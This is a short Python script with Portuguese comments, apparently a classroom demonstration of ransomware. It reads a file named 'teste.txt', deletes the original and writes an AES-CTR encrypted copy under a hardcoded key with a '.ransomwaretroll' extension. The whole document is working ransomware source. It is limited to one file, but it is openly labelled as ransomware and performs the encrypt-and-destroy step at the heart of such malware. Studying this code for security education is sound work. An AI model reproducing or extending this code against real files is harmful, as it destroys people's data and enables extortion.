import os ##importa o sistema operacional
import pyaes ##importa o algoritmo que vai criptografar o arquivo

##abrir o arquivo a ser criptografado
file_name = 'teste.txt' ##é o nome do arquivo que vai abrir
file = open(file_name, 'rb') ##abre o arquivo
file_data = file.read() ##vai ler o conteúdo do arquivo
file.close() ##para fechar o arquivo
##aqui abriu o arquivo, leu o conteúdo e fechou

##remover o arquivo original
os.remove(file_name) ##excluindo o arquivo após a leitura

##definir a chave de encriptação
key = b"testeransomwares" ## chave com 16 caracteres
aes = pyaes.AESModeOfOperationCTR(key) ##função para criptografar o arquivo com base na chave que passou

##criptografar o arquivo
crypto_data = aes.encrypt(file_data) ##encriptou o conteúdo do arquivo teste.txt

##salvar o arquivo criptografado
new_file = file_name + '.ransomwaretroll' ##renomeando o arquivo novo e concatenando com ransomwaretroll
new_file = open(f'{new_file}','wb') ##abrir o arquivo e escrever

new_file.write(crypto_data) ##escreve o arquivo
new_file.close() ##para fechar
